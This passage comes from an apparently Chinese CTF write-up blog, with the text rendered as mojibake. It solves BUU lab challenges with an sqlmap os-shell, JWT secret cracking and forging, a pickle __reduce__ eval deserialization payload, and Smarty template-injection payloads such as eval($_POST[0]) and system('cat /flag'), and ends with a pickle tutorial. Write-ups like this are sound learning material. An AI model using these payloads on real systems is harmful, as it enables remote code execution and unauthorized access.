<p>ç™»é™†åå°ï¼š</p>
<p>æºç ä¸­å¯ä»¥çœ‹è§ï¼šwriteuser_00001_log.log</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyMToyMToxNi9pcDoxMjcuMC4wLjEvdmlldzp3aWZlLmh0bWw=</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyMToyMToyMC9pcDoxMjcuMC4wLjEvdmlldzpkYXFpLmh0bWw=</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyMToyMjozMy9pcDoxMjcuMC4wLjEvdmlldzpqaWF5b3UuaHRtbA==</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyMToyNToxNi9pcDoxMjcuMC4wLjEvdmlldzphZG1pbmlzdHJhdG9yLmh0bWw=</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyMToyOToxNi9pcDoxMjcuMC4wLjEvdmlldzpkYXFpLmh0bWw=</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyMjoyMToxNi9pcDoxMjcuMC4wLjEvdmlldzptZW8ucGhw</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyMzoyMToxNi9pcDoxMjcuMC4wLjEvdmlldzptZXNzLnBocA==</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyNDoyMzoxNC9pcDoxMjcuMC4wLjEvdmlldzplY3kucGhw</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyNjoyMTozMy9pcDoxMjcuMC4wLjEvdmlldzpob21lLnBocA==</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyNzoyMTo1Ni9pcDoxMjcuMC4wLjEvdmlldzppbmRleC5waHA=</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyNzoyMzoxNi9pcDoxMjcuMC4wLjEvdmlldzp1cF9sb19hZF9hZF9taW4ucGhw</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyODoyMjoyNi9pcDoxMjcuMC4wLjEvdmlldzptZXNzLnBocA==</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyODoyNToyNi9pcDoxMjcuMC4wLjEvdmlldzo0MDQuaHRtbA==</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyOToxOToxNi9pcDoxMjcuMC4wLjEvdmlldzphZG1pbi5waHA=</span><br></pre></td></tr></table></figure>

<p>å…¨éƒ¨è§£å¯†å‡ºæ¥ï¼Œup_lo_ad_ad_min.phpï¼š</p>
<p>è®¿é—®ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">éæ³•æ–‡ä»¶ç±»å‹</span><br><span class="line">è¯·å…ˆå»up_lo_ad_er_security.phpè¿›è¡Œç™»å½•</span><br></pre></td></tr></table></figure>

<p>ç”¨user 00001å»ç™»é™†ï¼Œå‘ç°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„ç‚¹ï¼Œç»“åˆä¹‹å‰çš„sqlæ³¨å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨è¿™é‡Œå†™shellè¿›å»è·å–æƒé™</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">45948ä¸Šä¼ æ–‡ä»¶å: 1 (2).jpg</span><br><span class="line">æ–‡ä»¶ç±»å‹: image/jpeg</span><br><span class="line">æ–‡ä»¶å¤§å°: 44.87109375 kB</span><br><span class="line">æ–‡ä»¶ä¸´æ—¶å­˜å‚¨çš„ä½ç½®: /tmp/phpJluzIg</span><br><span class="line">æ–‡ä»¶å­˜å‚¨åœ¨: upl_oad_pat_h/1 (2).jpg</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å°†shellä¸Šä¼ åˆ°upl_oad_pat_hç›®å½•ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">which web application language does the web server support?</span><br><span class="line">[1] ASP</span><br><span class="line">[2] ASPX</span><br><span class="line">[3] JSP</span><br><span class="line">[4] PHP (default)</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 4</span></span><br><span class="line">[17:30:56] [WARNING] unable to automatically retrieve the web server document root</span><br><span class="line">what do you want to use for writable directory?</span><br><span class="line">[1] common location(s) (&#x27;/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs&#x27;) (default)</span><br><span class="line">[2] custom location(s)</span><br><span class="line">[3] custom directory list file</span><br><span class="line">[4] brute force search</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">os-shell&gt;</span><span class="bash"> cat /flag</span></span><br><span class="line">do you want to retrieve the command standard output? [Y/n/a] y</span><br><span class="line">command standard output: &#x27;flag&#123;d1ddddhm_swpu_e@sy_h@ck&#125;&#x27;</span><br><span class="line"><span class="meta">os-shell&gt;</span><span class="bash"> </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>ikun</title>
    <url>/2020/12/06/ikun/</url>
    <content><![CDATA[<h1 id="è€ƒç‚¹"><a href="#è€ƒç‚¹" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h1><ol>
<li>Pythoné€»è¾‘æ¼æ´</li>
<li>JWTä¼ªé€ </li>
</ol>
<h1 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h1><p>ç¬¬ä¸€æ­¥ï¼Œæˆ‘ä»¬çˆ†ç ´æ‰¾åˆ°LV6è´¦å·ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">999</span>):</span><br><span class="line">    url = <span class="string">&quot;http://25bf3014-fd74-4f4e-882b-5b310346732e.node3.buuoj.cn/shop?page=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    res = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;lv6.png&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è´­ä¹°çš„æ—¶å€™å¤šç‚¹å‡ ä¸‹è§¦å‘æ‰“æŠ˜ï¼Œç„¶åæˆ‘ä»¬æ‰‹åŠ¨æŠŠæŠ˜æ‰£æ”¹çš„ç‰¹åˆ«ä½</p>
<p><img src="image-20201206194646805.png" alt="image-20201206194646805"></p>
<p>å¾—åˆ°urlï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b1g_m4mber</span><br></pre></td></tr></table></figure>

<p>éœ€è¦æˆ‘ä»¬ç”¨adminç™»é™†ï¼Œçœ‹çœ‹è‡ªå·±çš„æƒ…å†µï¼Œå¤§æ¦‚åªèƒ½ç”¨JWTä¼ªé€ äº†ï¼Œæ²¡æœ‰å¯†é’¥ä¸¢è¿›å»çˆ†ç ´å¥½äº†ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ysllz@kali:~/æ¡Œé¢/c-jwt-cracker$ ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEifQ.8iYM4QgkAw4NpjpP8tEn7MBbZoF-Kj8YRbosz3Qrr-Q</span><br><span class="line">Secret is &quot;1Kun&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™ä¸ªurlä¸‹é¢ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;jwt.io&#x2F;</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘ä¹‹åå¾—åˆ°ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</span><br></pre></td></tr></table></figure>

<p>ä¹‹åå»ä¸ªäººä¸­å¿ƒçš„é‚®ç®±åœ°å€ä¸‹é¢ç»™äº†ä¸ªhintï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">é‚®ç®±åœ°å€ï¼šhint: \u8fd9\u7f51\u7ad9\u4e0d\u4ec5\u53ef\u4ee5\u4ee5\u8585\u7f8a\u6bdb\uff0c\u6211\u8fd8\u7559\u4e86\u4e2a\u540e\u95e8\uff0c\u5c31\u85cf\u5728\u006c\u0076\u0036\u91cc</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°è¿™å¥è¯ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">è¿™ç½‘ç«™ä¸ä»…å¯ä»¥ä»¥è–…ç¾Šæ¯›ï¼Œæˆ‘è¿˜ç•™äº†ä¸ªåé—¨ï¼Œå°±è—åœ¨lv6é‡Œ</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui text container login-wrap-inf&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- æ½œä¼æ•Œåå·²ä¹…,åªèƒ½å¸®åˆ°è¿™äº† --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/static/asd1f654e683wq/www.zip&quot;</span> &gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;visibility:hidden&quot;</span>&gt;</span>åˆ åº“è·‘è·¯å‰æˆ‘ç•™äº†å¥½ä¸œè¥¿åœ¨è¿™é‡Œ<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segments center padddd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- å¯¹æŠ—*ç«™é»‘ç§‘æŠ€ï¼Œç›®å‰ä¸ºæµ‹è¯•é˜¶æ®µï¼Œåªå¯¹ç®¡ç†å‘˜å¼€æ”¾ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segment&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/b.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>æŠŠæºç dumpä¸‹æ¥ï¼Œåœ¨Admin.pyå½“ä¸­æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è§¦å‘ç‚¹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>æ‰¾äº†ä¸€ç¯‡å†™pickleçš„åšå®¢ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;bluehawksky&#x2F;article&#x2F;details&#x2F;79027055</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="comment"># data = &#123;&#x27;foo&#x27;: [1,2,3],</span></span><br><span class="line"><span class="comment">#                 &#x27;bar&#x27;: (&#x27;Hello&#x27;, &#x27;world!&#x27;),</span></span><br><span class="line"><span class="comment">#                 &#x27;baz&#x27;: True&#125;</span></span><br><span class="line"><span class="comment"># jar = open(&#x27;data.pkl&#x27;, &#x27;wb&#x27;)</span></span><br><span class="line"><span class="comment"># pickle.dump(data, jar) # å°†pickleåçš„æ•°æ®å†™å…¥jaræ–‡ä»¶</span></span><br><span class="line"><span class="comment"># jar.close()</span></span><br><span class="line"></span><br><span class="line">pkl_file = <span class="built_in">open</span>(<span class="string">&#x27;data.pkl&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">data = pickle.load(pkl_file)</span><br><span class="line">print(data)</span><br><span class="line">pkl_file.close()</span><br></pre></td></tr></table></figure>

<p>å¤§æ¦‚è¿‡ç¨‹å°±è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¯»å–æ–‡ä»¶äº†ï¼Œä½†æ˜¯å¾ˆæ˜æ˜¾è¿™ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œå› ä¸ºæˆ‘ä»¬çš„éœ€è¦çš„æ˜¯ä¸€ä¸ªé­”æœ¯æ–¹æ³•ï¼Œå½“æˆ‘ä»¬çš„æ–‡ä»¶ç»è¿‡æºç ä¸­çš„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = pickle.loads(urllib.unquote(become))</span><br></pre></td></tr></table></figure>

<p>loadsè¿‡ç¨‹ï¼Œæˆ–è€…è¯´æ˜¯urlib.unquoteçš„æ—¶å€™ä¼šè‡ªåŠ¨è§¦å‘çš„é­”æœ¯æ–¹æ³•æ‰å¯ä»¥</p>
<p>åœ¨å®˜æ–¹æ–‡æ¡£ä¸­å¯ä»¥æ‰¾åˆ°ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">__reduce__(self)</span><br><span class="line">å½“å®šä¹‰æ‰©å±•ç±»å‹æ—¶ï¼ˆä¹Ÿå°±æ˜¯ä½¿ç”¨Pythonçš„Cè¯­è¨€APIå®ç°çš„ç±»å‹ï¼‰ï¼Œå¦‚æœä½ æƒ³pickleå®ƒä»¬ï¼Œä½ å¿…é¡»å‘Šè¯‰Pythonå¦‚ä½•pickleå®ƒä»¬ã€‚ __reduce__ è¢«å®šä¹‰ä¹‹åï¼Œå½“å¯¹è±¡è¢«Pickleæ—¶å°±ä¼šè¢«è°ƒç”¨ã€‚å®ƒè¦ä¹ˆè¿”å›ä¸€ä¸ªä»£è¡¨å…¨å±€åç§°çš„å­—ç¬¦ä¸²ï¼ŒPyhtonä¼šæŸ¥æ‰¾å®ƒå¹¶pickleï¼Œè¦ä¹ˆè¿”å›ä¸€ä¸ªå…ƒç»„ã€‚è¿™ä¸ªå…ƒç»„åŒ…å«2åˆ°5ä¸ªå…ƒç´ ï¼Œå…¶ä¸­åŒ…æ‹¬ï¼šä¸€ä¸ªå¯è°ƒç”¨çš„å¯¹è±¡ï¼Œç”¨äºé‡å»ºå¯¹è±¡æ—¶è°ƒç”¨ï¼›ä¸€ä¸ªå‚æ•°å…ƒç´ ï¼Œä¾›é‚£ä¸ªå¯è°ƒç”¨å¯¹è±¡ä½¿ç”¨ï¼›è¢«ä¼ é€’ç»™ __setstate__ çš„çŠ¶æ€ï¼ˆå¯é€‰ï¼‰ï¼›ä¸€ä¸ªäº§ç”Ÿè¢«pickleçš„åˆ—è¡¨å…ƒç´ çš„è¿­ä»£å™¨ï¼ˆå¯é€‰ï¼‰ï¼›ä¸€ä¸ªäº§ç”Ÿè¢«pickleçš„å­—å…¸å…ƒç´ çš„è¿­ä»£å™¨ï¼ˆå¯é€‰ï¼‰ï¼›</span><br><span class="line"></span><br><span class="line">__reduce_ex__(self)</span><br><span class="line">__reduce_ex__ çš„å­˜åœ¨æ˜¯ä¸ºäº†å…¼å®¹æ€§ã€‚å¦‚æœå®ƒè¢«å®šä¹‰ï¼Œåœ¨pickleæ—¶ __reduce_ex__ ä¼šä»£æ›¿ __reduce__ è¢«è°ƒç”¨ã€‚ __reduce__ ä¹Ÿå¯ä»¥è¢«å®šä¹‰ï¼Œç”¨äºä¸æ”¯æŒ __reduce_ex__ çš„æ—§ç‰ˆpickleçš„APIè°ƒç”¨ã€‚</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œåªèƒ½ä½¿ç”¨reduceè¿™ä¸€é­”æœ¯æ–¹æ³•ï¼Œå› ä¸ºä»…ä»…æœ‰è¯¥é­”æœ¯æ–¹æ³•ä¼šå‘Šè¯‰Pythonä½ çš„æ–‡ä»¶è¢«pickleè°ƒç”¨çš„æ—¶å€™è¯¥å¦‚ä½•ä½¿ç”¨å®ƒâ€¦</p>
<p>æ•…æˆ‘ä»¬ç”¨è¯¥é­”æœ¯æ–¹æ³•ç”Ÿæˆpayload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line"></span><br><span class="line">c__builtin__%<span class="number">0</span>Aeval%<span class="number">0</span>Ap0%<span class="number">0</span>A%<span class="number">28</span>S%<span class="number">22</span><span class="built_in">open</span>%<span class="number">28</span>%<span class="number">27</span>/flag.txt%<span class="number">27</span>%<span class="number">2</span>C%<span class="number">27</span>r%<span class="number">27</span>%<span class="number">29.</span>read%<span class="number">28</span>%<span class="number">29</span>%<span class="number">22</span>%<span class="number">0</span>Ap1%<span class="number">0</span>Atp2%<span class="number">0</span>ARp3%<span class="number">0</span>A.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>BUU</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2019WEB11</title>
    <url>/2020/12/08/CISCN2019WEB11/</url>
    <content><![CDATA[<h1 id="çŸ¥è¯†ç‚¹ï¼š"><a href="#çŸ¥è¯†ç‚¹ï¼š" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h1><ol>
<li>XFFæ³¨å…¥</li>
<li>æ¨¡æ¿æ³¨å…¥smarty</li>
</ol>
<h2 id="smarty"><a href="#smarty" class="headerlink" title="smarty"></a>smarty</h2><p>â€‹    è¿™æ˜¯PHPçš„ä¸€ä¸ªæ¨¡æ¿è¯­è¨€ï¼Œç±»ä¼¼äºflaskçš„jinjia2ï¼Œsmartyä¹Ÿå¯ä»¥è®©æˆ‘ä»¬è§£æPHPçš„é€»è¾‘è¯­è¨€ï¼Œæ¯”å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡{system(â€œlsâ€)}æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œé™¤æ­¤ä¹‹å¤–ï¼ŒPHPsmartyè¿˜æœ‰å¾ˆå¤šéªšæ€è·¯ï¼š</p>
<h3 id="php-php"><a href="#php-php" class="headerlink" title="{php}{/php}"></a>{php}{/php}</h3><p> å¯ä»¥æ‰§è¡Œphpçš„ä»£ç </p>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#123;php&#125;eval($_POST[0]);&#123;/php&#125;</span><br></pre></td></tr></table></figure>

<h3 id="literal"><a href="#literal" class="headerlink" title="{literal}"></a>{literal}</h3><p>è¯¥æ ‡ç­¾å¯ä»¥è®©ä¸€æ®µæ ‡ç­¾ä»£ç åŸæ ·è¾“å‡ºï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#123;literal&#125;&lt;script language=&quot;php&quot;&gt;system(&quot;ls&quot;);&lt;/script&gt;&#123;/literal&#125;</span><br></pre></td></tr></table></figure>

<h3 id="é™æ€æ–¹æ³•"><a href="#é™æ€æ–¹æ³•" class="headerlink" title="é™æ€æ–¹æ³•"></a>é™æ€æ–¹æ³•</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#123;self::getStreamVariable(â€œfile:///etc/passwdâ€)&#125;</span><br></pre></td></tr></table></figure>

<h3 id="if-æ ‡ç­¾"><a href="#if-æ ‡ç­¾" class="headerlink" title="{if}æ ‡ç­¾"></a>{if}æ ‡ç­¾</h3><p>å®˜æ–¹æ–‡æ¡£ä¸­çœ‹åˆ°è¿™æ ·çš„æè¿°ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Smartyçš„&#123;if&#125;æ¡ä»¶åˆ¤æ–­å’ŒPHPçš„iféå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†ä¸€äº›ç‰¹æ€§ã€‚æ¯ä¸ª&#123;if&#125;å¿…é¡»æœ‰ä¸€ä¸ªé…å¯¹çš„&#123;/if&#125;ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨&#123;else&#125; å’Œ &#123;elseif&#125;ï¼Œå…¨éƒ¨çš„PHPæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ï¼Œå¦‚||*, or, &amp;&amp;, and, is_array(), ç­‰ç­‰ï¼Œå¦‚ï¼š&#123;if is_array($array)&#125;&#123;/if&#125;*</span><br></pre></td></tr></table></figure>

<p>ä¸Šè¿°éƒ½æ‘˜è‡ªæ–‡ç« ï¼š<a href="https://blog.csdn.net/qq_45521281/article/details/107556915">https://blog.csdn.net/qq_45521281/article/details/107556915</a></p>
<h1 id="åšé¢˜æ€è·¯"><a href="#åšé¢˜æ€è·¯" class="headerlink" title="åšé¢˜æ€è·¯"></a>åšé¢˜æ€è·¯</h1><p>é¢˜ç›®å¼€å§‹å°±ç»™äº†IPçš„åœ°æ–¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨è¿™é‡Œè¿›è¡Œæ³¨å…¥ï¼Œå¼€å§‹æˆ‘è¿˜ä»¥ä¸ºæ˜¯SQLMAPã€‚ã€‚ä¸è¿‡åæ¥å‘ç°ä¸æ˜¯ï¼Œæ˜¯SMARTYæ¨¡æ¿æ³¨å…¥</p>
<p>æ•…æˆ‘ä»¬ç›´æ¥åœ¨XXFè¾“å‡º{system(â€œcat /flagâ€)} æˆ–è€…{if system(â€œcat /flagâ€)}{/if}</p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Pythonååºåˆ—åŒ–</title>
    <url>/2020/12/07/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>ä»Šå¤©åœ¨åˆ·BUUçš„æ—¶å€™åšåˆ°äº†IKUNè¿™é“é¢˜ç›®ï¼Œä»¥å‰æ²¡æœ‰æ¥è§¦è¿‡Pythonçš„ååºåˆ—åŒ–ï¼Œæ‰€ä»¥ä¸ä¼šåšåˆ°æœ€åä¸€æ­¥..å¤ç°å®Œä¹‹åå†³å®šæ€»ç»“ä¸€ä¸‹Pythonçš„ååºåˆ—åŒ–çš„å‡ ç§æ–¹å¼ï¼š</p>
<p>Pythonèƒ½å¤Ÿå®ç°çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ–¹å¼ä¸»è¦æœ‰ä¸‰ï¼š</p>
<ul>
<li>JSON</li>
<li>pickle</li>
<li>shelve</li>
</ul>
<p>è€Œè¿™Ikunè¿™é“é¢˜ä½¿ç”¨çš„ä¾¿æ˜¯Pickleï¼Œæ•…æˆ‘ä»¬ä»è¿™ä¸€éƒ¨åˆ†å¼€å§‹è¯´èµ·ã€‚</p>
<h1 id="Pickle"><a href="#Pickle" class="headerlink" title="Pickle"></a>Pickle</h1><p>pickleæä¾›äº†ä¸€ä¸ªç®€å•çš„æŒä¹…åŒ–åŠŸèƒ½ã€‚å¯ä»¥å°†å¯¹è±¡ä»¥æ–‡ä»¶çš„å½¢å¼å­˜æ”¾åœ¨ç£ç›˜ä¸Šã€‚</p>
<p>pickleæ¨¡å—åªèƒ½åœ¨pythonä¸­ä½¿ç”¨ï¼Œpythonä¸­å‡ ä¹æ‰€æœ‰çš„æ•°æ®ç±»å‹ï¼ˆåˆ—è¡¨ï¼Œå­—å…¸ï¼Œé›†åˆï¼Œç±»ç­‰ï¼‰éƒ½å¯ä»¥ç”¨pickleæ¥åºåˆ—åŒ–ï¼Œ</p>
<p>pickleåºåˆ—åŒ–åçš„æ•°æ®ï¼Œå¯è¯»æ€§å·®ï¼Œäººä¸€èˆ¬æ— æ³•è¯†åˆ«ã€‚</p>
<p>Pythonæ¥å£æœ‰4ä¸ªï¼š</p>
<ul>
<li>dump</li>
<li>dumps</li>
<li>load</li>
<li>loads</li>
</ul>
<h2 id="dump"><a href="#dump" class="headerlink" title="dump"></a>dump</h2><p>dumpæˆ‘ä»¬ç”¨äºå°†æ•°æ®å†™å…¥æ–‡ä»¶å½“ä¸­ï¼Œå®˜æ–¹æ–‡æ¡£ä¸­ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dumpï¼ˆobjï¼Œfileï¼Œprotocol = <span class="literal">None</span>ï¼Œ*ï¼Œfix_imports = <span class="literal">True</span> ï¼‰</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥å®è·µä¸€ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, n, a</span>):</span></span><br><span class="line">        self.name = n</span><br><span class="line">        self.age = a</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(self.name + <span class="string">&quot;_&quot;</span> + <span class="built_in">str</span>(self.age))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aa = Person(<span class="string">&quot;JGood&quot;</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;p.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">pickle.dump(aa,f,<span class="number">0</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">å¾—åˆ°æ•°æ®å¦‚ä¸‹ï¼š</span><br><span class="line">ccopy_reg</span><br><span class="line">_reconstructor</span><br><span class="line">p0</span><br><span class="line">(c__main__</span><br><span class="line">Person</span><br><span class="line">p1</span><br><span class="line">c__builtin__</span><br><span class="line"><span class="built_in">object</span></span><br><span class="line">p2</span><br><span class="line">Ntp3</span><br><span class="line">Rp4</span><br><span class="line">(dp5</span><br><span class="line">Vname</span><br><span class="line">p6</span><br><span class="line">VJGood</span><br><span class="line">p7</span><br><span class="line">sVage</span><br><span class="line">p8</span><br><span class="line">I2</span><br><span class="line">sb.</span><br><span class="line"><span class="comment"># è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œä¼šæœ‰å¤§é‡çš„\næ¢è¡Œç¬¦</span></span><br></pre></td></tr></table></figure>

